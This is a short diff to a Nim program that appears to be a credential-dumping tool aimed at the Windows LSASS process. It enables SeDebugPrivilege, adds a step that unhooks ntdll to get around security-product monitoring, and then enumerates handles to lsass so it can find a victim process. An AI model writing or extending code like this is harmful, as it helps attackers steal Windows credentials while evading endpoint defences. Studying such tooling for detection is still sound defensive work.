@@ -298,7 +298,13 @@ when isMainModule:
         echo "[-] Failed to Enable SeDebugPrivilege\n[!] Quitting..."
         quit(1)
         #discard readLine(stdin)
-    
+
+    echo "[!] Attempting to Refresh Target DLL..."
+    if ntdllunhook():
+        echo "[+] Successfully Refreshed Target DLL!\n"
+    else:
+        echo "[-] Could Not Refresh Target DLL!\n"
+
     var 
         dupHandlesSeq = enumLsassHandles()
         victimHandle: HANDLE = cast[HANDLE](NULL)
@@ -313,10 +319,7 @@ when isMainModule:
 
         while NtGetNextProcess(victimHandle, MAXIMUM_ALLOWED, 0, 0, addr victimHandle) == 0:
             
-            
-
             if GetProcessImageFileNameA(victimHandle, procName, MAX_PATH) == 0:
-                
                 echo "[-] Failed to Retrieve Process Name! Error: ", GetLastError(), "\n[!] Quitting..."
                 quit(1)
 
